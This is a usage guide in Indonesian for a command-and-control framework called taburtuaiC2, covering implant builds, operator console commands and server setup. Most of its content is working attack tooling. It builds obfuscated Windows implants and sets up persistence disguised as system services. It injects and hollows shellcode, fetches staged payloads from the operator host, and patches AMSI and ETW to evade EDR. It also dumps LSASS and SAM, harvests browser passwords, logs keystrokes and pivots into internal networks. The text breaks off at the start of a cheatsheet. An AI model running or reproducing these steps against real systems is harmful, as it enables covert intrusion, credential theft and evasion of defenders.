# taburtuaiC2 — Build & Usage Guide

> Panduan lengkap untuk build implant, menjalankan server, dan menggunakan semua fitur yang telah diimplementasikan.

---

## Daftar Isi

1. [Requirements](#1-requirements)
2. [Build Server](#2-build-server)
3. [Build Implant (Agent)](#3-build-implant-agent)
4. [Menjalankan Server](#4-menjalankan-server)
5. [Menjalankan Operator Console](#5-menjalankan-operator-console)
6. [Web Dashboard](#6-web-dashboard)
7. [Enkripsi — Two-Phase (Bootstrap + ECDH Session)](#7-enkripsi--two-phase-bootstrap--ecdh-session)
8. [Team Server — Multi-Operator](#8-team-server--multi-operator)
9. [Fitur Dasar](#9-fitur-dasar)
10. [Injection & Evasion](#10-injection--evasion)
11. [EDR Bypass](#11-edr-bypass)
12. [Advanced Injection](#12-advanced-injection)
13. [Credential Access](#13-credential-access)
14. [Sleep Obfuscation](#14-sleep-obfuscation)
15. [NTDLL Unhooking](#15-ntdll-unhooking)
16. [Hardware Breakpoints (HWBP)](#16-hardware-breakpoints-hwbp)
17. [BOF Execution](#17-bof-execution)
18. [OPSEC Checks](#18-opsec-checks)
19. [Network Recon & Registry](#19-network-recon--registry)
20. [SOCKS5 Pivot](#20-socks5-pivot)
21. [Alternative Transports](#21-alternative-transports)
22. [OPSEC Profiles](#22-opsec-profiles)
23. [Troubleshooting](#23-troubleshooting)

---

## 1. Requirements

### C2 Server (Linux/macOS/Windows)

```
Go 1.21+
gcc (opsional, untuk CGO)
```

### Build Implant (Windows target)

```
Go 1.21+
GOOS=windows GOARCH=amd64 (cross-compile dari Linux/macOS)
garble (opsional, untuk obfuskasi)
upx (opsional, untuk kompresi)
```

Install tools:

```bash
# Install Go (jika belum)
# https://go.dev/dl/

# Install garble (string & symbol obfuscation)
go install mvdan.cc/garble@latest

# Install UPX (binary compression)
# Ubuntu/Debian
sudo apt install upx-ucl

# macOS
brew install upx

# Windows (chocolatey)
choco install upx
```

---

## 2. Build Server

```bash
# Clone project
cd taburtuaiC2

# Tidy dependencies
go mod tidy

# Build server binary
go build -o bin/server ./cmd/server

# Build operator CLI
go build -o bin/operator ./cmd/operator
```

---

## 3. Build Implant (Agent)

### 3.1 Build Script (Recommended)

Gunakan build script yang sudah tersedia:

```bash
# Lihat semua opsi
./scripts/build/build_agent.sh --help

# Build Windows agent (paling umum digunakan)
./scripts/build/build_agent.sh \
  --server http://192.168.1.10:8080 \
  --os windows \
  --arch amd64 \
  --stealth \
  --key "MySecretKey12345" \
  --secondary "MySecondaryKey45"

# Output: bin/agent_windows_amd64_stealth.exe
```

### 3.2 Build Manual dengan ldflags

Ini adalah cara yang memberikan kontrol penuh:

```bash
# Variabel yang bisa dikonfigurasi via ldflags:
#   serverURL            — URL C2 server
#   encKey               — primary AES encryption key (16 chars)
#   secondaryKey         — secondary key
#   defaultInterval      — beacon interval dalam detik
#   defaultJitter        — jitter persen (0-100)
#   defaultKillDate      — kill date (YYYY-MM-DD), kosong = tidak ada
#   defaultWorkingHoursOnly  — "true"/"false"
#   defaultWorkingHoursStart — jam mulai (0-23)
#   defaultWorkingHoursEnd   — jam selesai (0-23)
#   defaultEnableEvasion     — "true"/"false"
#   defaultSleepMasking      — "true"/"false"
#   defaultExecMethod        — direct|cmd|powershell|wmi|mshta
#   debugMode            — "true"/"false"

GOOS=windows GOARCH=amd64 CGO_ENABLED=0 go build \
  -ldflags "
    -X main.serverURL=http://192.168.1.10:8080
    -X main.encKey=SpookyOrcaC2AES1
    -X main.secondaryKey=TaburtuaiSecondary
    -X main.defaultInterval=30
    -X main.defaultJitter=20
    -X main.defaultKillDate=2026-12-31
    -X main.defaultWorkingHoursOnly=true
    -X main.defaultWorkingHoursStart=8
    -X main.defaultWorkingHoursEnd=18
    -X main.defaultEnableEvasion=true
    -X main.defaultSleepMasking=true
    -X main.defaultExecMethod=powershell
    -s -w -H windowsgui
  " \
  -o bin/agent.exe \
  ./agent
```

### 3.3 Build dengan Garble (OPSEC Build)

Garble mengobfuskasi nama fungsi, string literal, dan simbol debug:

```bash
GOOS=windows GOARCH=amd64 CGO_ENABLED=0 garble -tiny -literals -seed=random build \
  -ldflags "
    -X main.serverURL=http://192.168.1.10:8080
    -X main.encKey=SpookyOrcaC2AES1
    -X main.secondaryKey=TaburtuaiSecondary
    -X main.defaultInterval=60
    -X main.defaultJitter=30
    -X main.defaultEnableEvasion=true
    -X main.defaultSleepMasking=true
    -s -w -H windowsgui
  " \
  -o bin/agent_obf.exe \
  ./agent
```

### 3.4 Build dengan OPSEC Profile

```bash
# Lihat profile yang tersedia
ls builder/profiles/

# Build dengan profile stealth
./scripts/build/build_agent.sh \
  --server http://192.168.1.10:8080 \
  --os windows \
  --profile builder/profiles/stealth.yaml \
  --stealth \
  --compress
```

### 3.5 Build Linux Agent (untuk pivot)

```bash
GOOS=linux GOARCH=amd64 CGO_ENABLED=0 go build \
  -ldflags "
    -X main.serverURL=http://192.168.1.10:8080
    -X main.encKey=SpookyOrcaC2AES1
    -X main.defaultInterval=30
    -s -w
  " \
  -o bin/agent_linux \
  ./agent
```

### 3.6 Konfigurasi yang Perlu Diperhatikan

| Parameter | Nilai | Keterangan |
|-----------|-------|------------|
| `serverURL` | `http://IP:PORT` | Wajib diisi, URL C2 server |
| `encKey` | 16 karakter | AES key, harus sama dengan server |
| `defaultInterval` | `30`–`300` | Semakin panjang = semakin stealth |
| `defaultJitter` | `20`–`40` | Randomisasi interval beacon |
| `-H windowsgui` | Windows only | Hilangkan console window |
| `-s -w` | Semua OS | Strip debug symbols (~30% ukuran lebih kecil) |

---

## 4. Menjalankan Server

```bash
# Jalankan dengan default config
./bin/server

# Atau dari source
go run ./cmd/server

# Dengan API key (recommended untuk produksi)
./bin/server --api-key "rahasia123" --port 8080 --bind 0.0.0.0

# Background
nohup ./bin/server --port 8080 &
```

Verifikasi server berjalan:

```bash
curl http://localhost:8080/api/v1/health
# {"success":true,"data":{"status":"ok",...}}
```

---

## 5. Menjalankan Operator Console

### 5.1 Mode Interaktif (Direkomendasikan)

```bash
# Dari binary
./bin/operator console --server http://192.168.1.10:8080

# Dengan API key
./bin/operator console --server http://192.168.1.10:8080 --api-key "rahasia123"

# Atau dari source
go run ./cmd/operator console --server http://localhost:8080
```

Di dalam console, ketik `help` untuk melihat semua command.

### 5.2 Mode One-Shot (Scripting)

```bash
# Tanpa console, langsung jalankan command
./bin/operator --server http://192.168.1.10:8080 agents list
./bin/operator --server http://192.168.1.10:8080 cmd execute <agent-id> "whoami"
```

---

## 6. Web Dashboard

Dashboard tersedia di `http://<host>:<port>/` begitu server berjalan. Ini adalah Vue 3 SPA yang berkomunikasi langsung dengan API.

### Halaman yang tersedia

| Halaman | URL | Deskripsi |
|---------|-----|-----------|
| Overview | `/` | Statistik server, agent online/dormant/offline, command queue |
| Agents | `/agents` | Daftar semua agent + detail (OS, hostname, IP, last-seen) |
| Command History | `/commands` | Semua command beserta status dan output |
| Logs | `/logs` | Server logs realtime |
| Staged Payloads | `/payloads` | Manajemen payload yang di-stage untuk eksekusi |
| Team Server | `/team` | Operator sessions, agent claims, broadcast events |

### Menggunakan dengan API Key

Jika server dijalankan dengan `--auth`, semua request dari dashboard dan operator perlu menyertakan API key. Dashboard otomatis menyimpannya di `localStorage` setelah login pertama.

```bash
# Server dengan auth
ENCRYPTION_KEY=yourkey API_KEY=mytoken ./bin/server --port 9000 --auth

# Operator dengan API key
./bin/operator --server http://192.168.1.10:9000 --api-key mytoken agents list
```

---

## 7. Enkripsi — Two-Phase (Bootstrap + ECDH Session)

taburtuaiC2 menggunakan dua lapisan enkripsi:

### Phase 1 — Bootstrap (Static Key)

Saat agent pertama kali check-in, komunikasi dienkripsi menggunakan **AES-256-GCM** dengan key statis yang di-bake saat build (`--key` flag). Di fase ini agent mengirimkan ECDH public key-nya ke server.

### Phase 2 — ECDH Session Key

Server menghasilkan ephemeral ECDH P-256 key pair, menghitung shared secret dengan public key agent, lalu menurunkan 32-byte session key via SHA-256:

```
session_key = SHA-256(shared_secret || "taburtuai-c2-session-v1")
```

Session key ini disimpan di metadata agent (`_session_key`). **Semua traffic setelah checkin** (commands, results, file transfers) dienkripsi dengan session key ini — bukan static key.

### Implikasi praktis

- Jika server restart, session key hilang (tersimpan di memory/SQLite per-agent). Agent perlu check-in ulang untuk negosiasi key baru.
- Static key (`ENCRYPTION_KEY`) hanya digunakan untuk bootstrap. Jangan gunakan key yang sama di banyak engagement.
- Agent menyertakan `agent_id` sebagai plaintext di outer wrapper agar server bisa lookup session key yang tepat tanpa perlu decrypt dulu.
- Fallback ke static key otomatis terjadi jika session key belum ada (pre-ECDH agent atau agent lama).

### Cara verifikasi enkripsi aktif

```bash
# Cek di server log — setelah checkin agent, akan ada baris:
# "ECDH session key established for agent <id>"

# Di agent, session key aktif saat activeCrypto() != nil
# (terlihat di debug log jika --debug build)
```

---

## 8. Team Server — Multi-Operator

taburtuaiC2 mendukung multiple operator terhubung ke satu server secara bersamaan.

### Konsep Agent Claim

Untuk mencegah dua operator mengirim command ke agent yang sama secara bersamaan, sistem menggunakan **claim ownership**:

```bash
# Claim agent (operator A)
team claim <agent-id>

# Sekarang operator lain yang mencoba cmd execute akan mendapat error:
# "agent <id> is claimed by <session> — release it first"

# Release agent setelah selesai
team release <agent-id>

# Lihat semua claims aktif
team claims
```

### Session ID

Setiap operator session memiliki UUID unik yang dikirim via header `X-Session-ID`. Operator CLI mengelola ini secara otomatis.

### Broadcast Events

Saat agent mengirim hasil command, semua operator yang terhubung mendapat notifikasi via WebSocket-like event:

```
[event] result_ready agent=<id> cmd=execute status=completed duration=1.23s
```

---

## 9. Fitur Dasar

### Lihat agent yang terhubung

```
agents list
agents info <agent-id>
```

### Shell interaktif

```
shell <agent-id>
```

### Eksekusi command

```bash
# Eksekusi langsung
cmd execute <id> "whoami /all"
cmd execute <id> "ipconfig /all"
cmd execute <id> "net user"

# Tunggu hasilnya
cmd execute <id> "net localgroup administrators" --wait
```

### Upload / Download file

```bash
# Upload file dari operator ke agent
files upload <id> /local/path/tool.exe C:\Windows\Temp\tool.exe

# Download file dari agent ke operator
files download <id> C:\Windows\Temp\dump.txt /local/out.txt
```

### Manajemen proses

```bash
process list <id>
process kill <id> --pid 1234
process kill <id> --name notepad.exe
process start <id> C:\Windows\System32\cmd.exe
```

### Persistence

```bash
# Registry Run key
persistence setup <id> --method registry_run --path "C:\Windows\Temp\agent.exe"

# Scheduled Task
persistence setup <id> --method schtasks --path "C:\Windows\Temp\agent.exe" --name "WindowsUpdate"

# Windows Service
persistence setup <id> --method service --path "C:\Windows\Temp\agent.exe" --name "WinDefSvc"

# WMI Event Subscription
persistence setup <id> --method wmi_event --path "C:\Windows\Temp\agent.exe" --name "SystemEvent"

# Hapus persistence
persistence remove <id> --method registry_run --name "WindowsUpdate"
```

---

## 10. Injection & Evasion

### Process Injection

```bash
# CRT injection ke remote process
inject remote <id> --pid 1234 --file /tmp/shellcode.bin

# APC injection (lebih stealth)
inject remote <id> --pid 1234 --file /tmp/shellcode.bin --method apc

# In-memory exec di agent process (fileless)
inject self <id> --file /tmp/shellcode.bin --wait

# Spawn dengan PPID spoofing (parent = explorer.exe)
inject ppid <id> C:\Windows\System32\cmd.exe --ppid-name explorer.exe
inject ppid <id> C:\Windows\System32\powershell.exe --ppid 1024 --args "-NoP -W Hidden"
```

### Staged Payload

```bash
# Download shellcode dari URL → eksekusi in-memory (fileless)
staged <id> http://192.168.1.10/sc.bin

# Download → inject ke remote PID
staged <id> http://192.168.1.10/sc.bin --method crt --pid 1234
staged <id> http://192.168.1.10/sc.bin --method apc --pid 1234

# Tunggu hasilnya
staged <id> http://192.168.1.10/sc.bin --wait
```

### Timestomping

```bash
# Copy timestamp dari kernel32.dll (default)
timestomp <id> C:\Windows\Temp\malware.exe

# Copy timestamp dari file tertentu
timestomp <id> C:\Windows\Temp\malware.exe --ref C:\Windows\explorer.exe

# Set timestamp eksplisit
timestomp <id> C:\Windows\Temp\malware.exe --time 2021-06-15T09:00:00Z
```

### LOLBin Fetch

```bash
# Download via certutil (default)
fetch <id> http://192.168.1.10/tool.exe C:\Windows\Temp\tool.exe

# Download via BITS (mirip Windows Update traffic)
fetch <id> http://192.168.1.10/tool.exe C:\Windows\Temp\tool.exe --method bitsadmin

# Download via curl.exe
fetch <id> http://192.168.1.10/tool.exe C:\Windows\Temp\tool.exe --method curl

# Download via PowerShell WebClient
fetch <id> http://192.168.1.10/tool.exe C:\Windows\Temp\tool.exe --method powershell
```

### NTFS Alternate Data Streams

```bash
# Sembunyikan file di ADS
ads write <id> /local/tool.exe C:\Windows\Temp\legit.txt:hidden

# Baca dari ADS
ads read <id> C:\Windows\Temp\legit.txt:hidden /local/out.bin

# Eksekusi script dari ADS via LOLBin
ads exec <id> C:\Windows\Temp\legit.txt:payload.js
```

---

## 11. EDR Bypass

### AMSI / ETW Bypass

```bash
# Patch AMSI di agent process
bypass amsi <id>

# Patch AMSI di remote process
bypass amsi <id> --pid 1234

# Patch ETW (suppress telemetry)
bypass etw <id>

# Patch ETW di remote PID
bypass etw <id> --pid 1234

# Tunggu konfirmasi
bypass amsi <id> --wait
```

### Token Manipulation

```bash
# List semua proses + token mereka
token list <id>

# Steal + impersonate token dari PID (butuh SeDebugPrivilege)
token steal <id> --pid 500

# Buat token dari credentials (lateral movement)
token make <id> --user Administrator --domain CORP --pass "P@ssw0rd"

# Revert ke token asli
token revert <id>
```

### Screenshot

```bash
# Ambil screenshot desktop
screenshot <id>

# Simpan ke file lokal
screenshot <id> --save /tmp/target_screen.png
```

### Keylogger

```bash
# Mulai keylogger
keylog start <id>

# Mulai keylogger, otomatis stop setelah 60 detik
keylog start <id> --duration 60

# Ambil keystrokes yang sudah tertangkap
keylog dump <id>

# Stop keylogger + ambil final buffer
keylog stop <id>
```

---

## 12. Advanced Injection

> Semua teknik di bawah memerlukan shellcode raw binary (`.bin`).
> Bisa di-generate dengan msfvenom, Donut, sRDI, dll.

### Process Hollowing

Spawn host process dalam keadaan suspended, inject shellcode, redirect eksekusi via thread context patching.

```bash
# Hollow svchost.exe (default)
hollow <id> --file /tmp/sc.bin

# Hollow custom executable
hollow <id> --file /tmp/sc.bin --exe C:\Windows\System32\notepad.exe

# Tunggu hasilnya
hollow <id> --file /tmp/sc.bin --exe C:\Windows\System32\RuntimeBroker.exe --wait
```

**Cara kerja:** `CreateProcess(SUSPENDED)` → `VirtualAllocEx` → `WriteProcessMemory` → `GetThreadContext` → patch `RIP` → `SetThreadContext` → `ResumeThread`

### Thread Hijacking

Suspend thread yang ada, redirect RIP ke shellcode, resume.

```bash
# Hijack thread pertama di PID
hijack <id> --pid 1234 --file /tmp/sc.bin

# Tunggu hasilnya
hijack <id> --pid 1234 --file /tmp/sc.bin --wait
```

**Cara kerja:** `OpenThread(THREAD_ALL_ACCESS)` → `SuspendThread` → `VirtualAllocEx + WriteProcessMemory` → `GetThreadContext` → patch `RIP` → `SetThreadContext` → `ResumeThread`

### Module Stomping

Load DLL korban ke memori, overwrite section `.text`-nya dengan shellcode, eksekusi via thread pool.

```bash
# Stomp xpsservices.dll (default, low suspicion)
stomp <id> --file /tmp/sc.bin

# Stomp DLL custom
stomp <id> --file /tmp/sc.bin --dll "scrrun.dll"

# Tunggu hasilnya
stomp <id> --file /tmp/sc.bin --wait
```

**Cara kerja:** `LoadLibraryA(DLL)` → parse PE → `VirtualProtect(RWX)` → copy shellcode ke `.text` → `QueueUserWorkItem`

**Tips DLL yang cocok untuk stomping:**
- `xpsservices.dll` — kecil, jarang dipakai
- `scrrun.dll` — Windows Scripting Runtime
- `wbem\wmiutils.dll` — WMI utility

### Mapping Injection (NtCreateSection)

Tidak menggunakan `WriteProcessMemory` — deteksi EDR lebih sulit.

```bash
# Inject ke agent process sendiri (local)
mapinject <id> --file /tmp/sc.bin

# Cross-process inject ke PID target
mapinject <id> --file /tmp/sc.bin --pid 1234

# Tunggu hasilnya
mapinject <id> --file /tmp/sc.bin --pid 1234 --wait
```

**Cara kerja:** `NtCreateSection` → `NtMapViewOfSection(local, RW)` → copy shellcode → unmap → `NtMapViewOfSection(remote, RX)` → `CreateRemoteThread`

---

## 13. Credential Access

### LSASS Dump

> **Butuh:** SeDebugPrivilege (run as SYSTEM/elevated admin)

```bash
# Dump ke path default (%TEMP%\lsass.dmp)
creds lsass <id>

# Dump ke path custom
creds lsass <id> --output C:\Windows\Temp\werfault.dmp

# Tunggu selesai, lalu download
creds lsass <id> --output C:\Windows\Temp\ls.dmp --wait
files download <id> C:\Windows\Temp\ls.dmp /tmp/lsass.dmp

# Analisis offline dengan pypykatz
pypykatz lsa minidump /tmp/lsass.dmp
```

**Cara kerja:** `CreateToolhelp32Snapshot` → find lsass PID → `OpenProcess` → `MiniDumpWriteDump(MINIDUMP_WITH_FULL_MEMORY)`

### SAM Dump

> **Butuh:** SYSTEM privileges (SeBackupPrivilege)

```bash
# Dump ke %TEMP% (default)
creds sam <id>

# Dump ke direktori tertentu
creds sam <id> --dir C:\Windows\Temp --wait

# Download hasil
files download <id> C:\Windows\Temp\sam.save /tmp/sam.save
files download <id> C:\Windows\Temp\system.save /tmp/system.save
files download <id> C:\Windows\Temp\security.save /tmp/security.save

# Analisis offline
impacket-secretsdump -sam /tmp/sam.save -system /tmp/system.save LOCAL
```

### Browser Credentials

```bash
# Harvest semua browser (Chrome, Edge, Brave, Firefox)
creds browser <id>

# Tunggu hasilnya
creds browser <id> --wait
```

Output format:
```
[chrome] https://accounts.google.com  user=alice@gmail.com  pass=MyP@ssw0rd
[edge]   https://portal.azure.com     user=admin@corp.com   pass=Str0ngP@ss
[firefox] https://github.com          user=[base64:...]      pass=[base64:...]
```

**Catatan:** Chrome/Edge/Brave passwordnya langsung terdekripsi via DPAPI+AES-GCM. Firefox perlu offline cracking (NSS key4.db).

### Clipboard Capture

```bash
# Baca clipboard saat ini
creds clipboard <id>
```

Berguna untuk menangkap password yang baru di-copy, OTP, dsb.

---

## 14. Sleep Obfuscation

Menggunakan XOR untuk mengenkripsi memory region agent selama sleep, sehingga memory scanner tidak bisa membaca payload saat idle.

```bash
# Sleep 30 detik dengan memory obfuscation (default)
evasion sleep <id>

# Sleep custom duration
evasion sleep <id> --duration 60

# Tunggu selesai
evasion sleep <id> --duration 30 --wait
```

**Cara kerja:**
1. `VirtualQuery` — temukan region .text agent di memory
2. XOR encrypt region dengan key dari `GetTickCount64`
3. `time.Sleep(duration)`
4. XOR decrypt (key sama = self-inverse)

**Catatan:** Untuk beacon reguler, aktifkan `defaultSleepMasking=true` saat build agar setiap beacon sleep otomatis menggunakan `maskedSleep` (PAGE_NOACCESS selama sleep).

---

## 15. NTDLL Unhooking

Menghapus hook yang dipasang EDR di NTDLL dengan cara overwrite section `.text` dengan copy bersih dari disk.

```bash
# Unhook NTDLL (jalankan ini sebelum teknik injection lainnya)
evasion unhook <id>

# Tunggu konfirmasi
evasion unhook <id> --wait
```

**Cara kerja:**
1. Baca `%SystemRoot%\System32\ntdll.dll` langsung dari disk
2. Parse PE header → cari section `.text` (code)
3. `VirtualProtect(RWX)` pada loaded ntdll di memory
4. Overwrite `.text` dengan byte bersih dari file disk
5. Restore proteksi asli

**Best practice:** Jalankan `evasion unhook` sebagai langkah pertama sebelum:
- `bypass amsi`
- `bypass etw`
- Semua teknik injection

---

## 16. Hardware Breakpoints (HWBP)

Menggunakan debug registers (DR0-DR3) via VEH (Vectored Exception Handler) sebagai hook mechanism — tanpa menulis ke memory process.

```bash
# Set hardware breakpoint di address (execute breakpoint)
evasion hwbp set <id> --addr 0x7FFE1234 --register 0

# Set di DR1
evasion hwbp set <id> --addr 0x7FFE5678 --register 1

# Clear breakpoint di DR0
evasion hwbp clear <id> --register 0

# Tunggu konfirmasi
evasion hwbp set <id> --addr 0x7FFE1234 --register 0 --wait
```

**Penggunaan praktis — patchless AMSI bypass:**

Untuk patchless AMSI bypass via HWBP (tidak menulis ke AmsiScanBuffer):

1. Cari address `AmsiScanBuffer` di agent:
   ```
   cmd execute <id> "powershell -c \"[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Add-Type -MemberDefinition '[DllImport(\"amsi.dll\")] public static extern IntPtr AmsiScanBuffer(IntPtr a, IntPtr b, UInt32 c, IntPtr d, IntPtr e, IntPtr f);' -Name x -PassThru)::AmsiScanBuffer.Method.MethodHandle.GetFunctionPointer(), [System.Func[int]]).Invoke()\""
   ```
2. Set HWBP di address tersebut:
   ```
   evasion hwbp set <id> --addr <amsi_addr> --register 0
   ```

---

## 17. BOF Execution

Menjalankan Beacon Object Files (COFF object files) sepenuhnya in-memory, kompatibel dengan format Cobalt Strike BOF.

### Persiapan BOF

BOF bisa di-generate atau didownload dari:
- [TrustedSec/BOF-Collection](https://github.com/trustedsec/BOF-Collection)
- [Cobalt Strike Community Kit](https://cobalt-strike.github.io/community_kit/)
- Compile sendiri dengan `x86_64-w64-mingw32-gcc -c bof.c -o bof.o`

### Menjalankan BOF

```bash
# Eksekusi BOF tanpa argument
bof <id> /path/to/whoami.o

# Eksekusi dengan packed args (format CS datagram)
bof <id> /path/to/dir.o --args-file /tmp/dir_args.bin

# Tunggu output
bof <id> /path/to/whoami.o --wait

# Contoh BOF yang umum
bof <id> whoami.o --wait          # Current user + privs
bof <id> listdns.o --wait         # DNS cache
bof <id> ipconfig.o --wait        # Network interfaces
bof <id> sc_query.o --wait        # Services
```

### Membuat Packed Args

Format args untuk CS-compatible BOF menggunakan binary packing:

```python
# Python helper untuk pack args
import struct

def pack_string(s):
    b = s.encode('utf-8') + b'\x00'
    return struct.pack('<I', len(b)) + b

def pack_wstring(s):
    b = s.encode('utf-16-le') + b'\x00\x00'
    return struct.pack('<I', len(b)) + b

def pack_int(n):
    return struct.pack('<i', n)

# Contoh: pack args untuk dir BOF
# args: path = "C:\Users"
args = pack_wstring("C:\\Users")
with open('/tmp/dir_args.bin', 'wb') as f:
    f.write(args)
```

---

## 18. OPSEC Checks

### Anti-Debug Check

```bash
# Cek apakah ada debugger
opsec antidebug <id>

# Output: "clean" atau daftar artifacts yang ditemukan
# Exit code 1 = debugger terdeteksi
```

Check yang dilakukan:
- `IsDebuggerPresent()`
- `CheckRemoteDebuggerPresent()`
- `NtQueryInformationProcess(ProcessDebugPort)`
- Timing anomaly (loop execution time)

### Anti-VM Check

```bash
# Cek apakah running di VM/sandbox
opsec antivm <id>
```

Check yang dilakukan:
- CPUID hypervisor bit (via wmic model query)
- Registry artifacts: VMware Tools, VirtualBox Guest Additions, Hyper-V
- Process list: vmtoolsd, vboxservice, xenservice, qemu-ga, dll

### Time Gate (Working Hours + Kill Date)

```bash
# Set working hours (agent hanya aktif jam 08:00-18:00)
opsec timegate <id> --start 8 --end 18

# Set kill date (agent berhenti setelah tanggal ini)
opsec timegate <id> --kill-date 2026-12-31

# Kombinasi keduanya
opsec timegate <id> --start 9 --end 17 --kill-date 2026-06-30

# Tunggu konfirmasi
opsec timegate <id> --start 8 --end 18 --kill-date 2026-12-31 --wait
```

**Atau set saat build** (lebih stealth — tidak ada traffic untuk set timegate):

```bash
GOOS=windows GOARCH=amd64 go build \
  -ldflags "
    -X main.serverURL=http://192.168.1.10:8080
    -X main.encKey=SpookyOrcaC2AES1
    -X main.defaultKillDate=2026-12-31
    -X main.defaultWorkingHoursOnly=true
    -X main.defaultWorkingHoursStart=8
    -X main.defaultWorkingHoursEnd=18
    -s -w -H windowsgui
  " \
  -o bin/agent.exe ./agent
```

---

## 19. Network Recon & Registry

### Network Scan

```bash
# Scan subnet — temukan host aktif via ICMP/TCP
recon scan <id> --subnet 192.168.1.0/24

# Scan port tertentu pada range host
recon scan <id> --subnet 10.0.0.0/16 --ports 22,80,443,445,3389

# Tunggu hasilnya
recon scan <id> --subnet 192.168.1.0/24 --wait
```

### ARP Scan (Local Network)

```bash
# ARP scan — lebih cepat dan silent di LAN
recon arp <id>

# Output: daftar IP + MAC address yang merespons
```

### Registry Read/Write

```bash
# Baca registry key
registry read <id> HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run

# Baca single value
registry read <id> HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run --value UpdateService

# Tulis value baru
registry write <id> HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run \
  --value "MyApp" --data "C:\Windows\Temp\agent.exe" --type REG_SZ

# Hapus value
registry delete <id> HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run --value "MyApp"
```

---

## 20. SOCKS5 Pivot

Jalankan SOCKS5 proxy in-process di dalam agent — semua traffic di-tunnel melalui agent ke jaringan internal target.

### Memulai proxy

```bash
# Start SOCKS5 listener di port default (1080) di sisi operator
pivot start <id> --port 1080

# Start di port custom
pivot start <id> --port 9050

# Stop proxy
pivot stop <id>
```

### Menggunakan dengan tools

```bash
# Konfigurasi proxychains
# /etc/proxychains4.conf:
# socks5 127.0.0.1 1080

# Scan via pivot
proxychains nmap -sT -p 22,80,443,445 10.10.10.0/24

# RDP via pivot
proxychains xfreerdp /u:Administrator /p:Password123 /v:10.10.10.50

# SMB via pivot
proxychains impacket-smbclient 10.10.10.50
```

**Catatan:** SOCKS5 in-process menggunakan goroutine per connection. Untuk best performance, batasi concurrent connections. IPv4 dan IPv6 keduanya didukung.

---

## 21. Alternative Transports

Agent mendukung tiga transport alternatif selain HTTP standar. Transport dipilih saat build.

### DNS-over-HTTPS (DoH)

Data dikodekan dalam DNS queries menggunakan Cloudflare/Google DoH — menyatu dengan traffic DNS normal.

```bash
# Build dengan DoH transport
./scripts/build/build_agent.sh \
  --server https://doh.example.com \
  --transport doh \
  --os windows --arch amd64
```

**Cara kerja:** Agent mengkodekan payload dalam subdomain labels, menggunakan DNS TXT record sebagai channel respon. C2 server harus menjalankan DoH-compatible listener.

### ICMP Echo (Covert Channel)

Payload disembunyikan dalam ICMP echo request/reply payload — terlihat sebagai ping traffic normal.

```bash
# Build dengan ICMP transport
./scripts/build/build_agent.sh \
  --server 192.168.1.10 \
  --transport icmp \
  --os windows --arch amd64
```

**Batasan:** Memerlukan elevated privileges (raw socket). Cocok untuk jaringan yang memblokir TCP/UDP tapi mengizinkan ICMP.

### SMB Named Pipe

Komunikasi via named pipe — ideal untuk lateral movement tanpa jaringan eksternal.

```bash
# Build dengan SMB transport
./scripts/build/build_agent.sh \
  --server \\\\dc01\\pipe\\taburtuai \
  --transport smb \
  --os windows --arch amd64
```

**Cara kerja:** Agent membuat atau terhubung ke named pipe. Cocok untuk air-gapped environments atau saat agen di satu host bisa menjadi relay ke agent lain.

---

## 22. OPSEC Profiles

Profile disimpan di `builder/profiles/` dalam format YAML:

```yaml
# builder/profiles/stealth.yaml

# Beacon timing
sleep_interval: 300s      # 5 menit
jitter_percent: 40        # 40% randomisasi

# Lifecycle
kill_date: "2026-12-31"
max_retries: 3

# Working hours (Senin-Jumat, 08:00-18:00)
working_hours_only: true
working_hours_start: 8
working_hours_end: 18

# Evasion
enable_sandbox_check: true
enable_vm_check: true
enable_debug_check: true
sleep_masking: true
user_agent_rotation: true
```

Build dengan profile:

```bash
./scripts/build/build_agent.sh \
  --server https://c2.domain.com \
  --os windows \
  --profile builder/profiles/stealth.yaml \
  --stealth \
  --compress
```

---

## 23. Troubleshooting

### Agent tidak check-in

```bash
# Verifikasi server accessible dari target
curl http://192.168.1.10:8080/api/v1/health

# Pastikan firewall mengizinkan port
# Pastikan server berjalan
ps aux | grep server

# Cek logs server
./bin/server --verbose
```

### Command tidak terenkripsi / "No decryption key available"

Terjadi jika server restart dan session key ECDH hilang, tapi agent masih mencoba mengirim dengan session key lama.

```bash
# Solusi: hapus agent dari server agar check-in ulang (re-negosiasi ECDH)
./bin/operator --server http://... agents delete <agent-id>

# Agent akan check-in ulang pada beacon berikutnya dan mendapat session key baru
```

### "agent is claimed by <session> — release it first"

Operator lain sedang memegang claim pada agent tersebut.

```bash
# Lihat claims aktif
team claims

# Minta operator yang bersangkutan release, atau admin force-release:
team release <agent-id> --force
```

### Build error: "cgo: C compiler not found"

```bash
# Set CGO_ENABLED=0 (pure Go, no cgo)
export CGO_ENABLED=0
```

### Module stomping gagal: "shellcode exceeds .text section"

Shellcode terlalu besar untuk DLL target. Pilih DLL yang lebih besar:

```bash
# Ukur .text section DLL di Windows PowerShell
$pe = [System.Reflection.Assembly]::LoadFile("C:\Windows\System32\scrrun.dll")
```

Atau gunakan DLL yang lebih besar seperti `mscms.dll`, `version.dll`.

### LSASS dump gagal: "Access denied"

Butuh SeDebugPrivilege. Lakukan token impersonation dulu:

```bash
# Steal SYSTEM token dari winlogon (PID bisa bervariasi)
token steal <id> --pid <winlogon_pid>

# Baru dump LSASS
creds lsass <id> --wait
```

### BOF crash atau tidak ada output

1. Pastikan BOF dikompile untuk x86_64 (AMD64)
2. BOF harus menggunakan BeaconAPI yang kompatibel
3. Cek format packed args — pastikan sesuai
4. Coba jalankan dengan timeout yang lebih panjang: `--timeout 120`

### Hollow / hijack gagal di proses protected

Proses Protected Light (PPL) seperti `MsMpEng.exe` (Windows Defender) tidak bisa di-inject. Gunakan target non-protected:

```
notepad.exe, svchost.exe (non-critical instance),
RuntimeBroker.exe, calc.exe
```

### "NtCreateSection: NTSTATUS 0xC0000005" (mapping injection)

AV mungkin memblokir pembuatan section RWX. Coba:

```bash
# Gunakan NTDLL unhooking dulu
evasion unhook <id> --wait

# Lalu coba mapinject kembali
mapinject <id> --file /tmp/sc.bin --pid 1234
```

### GetAsyncKeyState keylogger tidak menangkap

Keylogger berbasis polling (10ms interval). Di VM atau RDP session, bisa ada delay. Pastikan:
- Agent berjalan dalam user session aktif (bukan SYSTEM service)
- Session bukan headless (perlu window station aktif)

---

## Quick Reference Cheatsheet

```
# ── Setup ──────────────────────────────────────────────────────────
